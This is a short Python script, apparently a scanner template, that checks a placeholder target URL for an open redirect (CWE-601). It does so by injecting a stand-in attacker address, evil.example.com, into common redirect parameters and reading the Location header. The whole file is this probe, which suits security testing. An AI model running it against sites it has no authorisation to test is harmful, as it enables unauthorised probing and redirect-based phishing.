import requests
import sys

# Target Configuration
TARGET_URL = "{{TARGET}}"
REDIRECT_PAYLOAD = "https://evil.example.com"

def check_vulnerability():
    print(f"[*] Testing {TARGET_URL} for open redirect (CWE-601)")

    params_to_try = ["url", "redirect", "next", "return", "returnUrl", "goto", "dest"]

    for param in params_to_try:
        try:
            resp = requests.get(
                TARGET_URL,
                params={param: REDIRECT_PAYLOAD},
                allow_redirects=False,
                timeout=10,
            )
            location = resp.headers.get("Location", "")
            if REDIRECT_PAYLOAD in location or "evil.example.com" in location:
                print(f"[+] SUCCESS: Open redirect via param '{param}' → {location}")
                return True
        except Exception as e:
            print(f"[-] Request failed for param '{param}': {e}")

    print("[-] No open redirect detected.")
    return False

if __name__ == "__main__":
    sys.exit(0 if check_vulnerability() else 1)
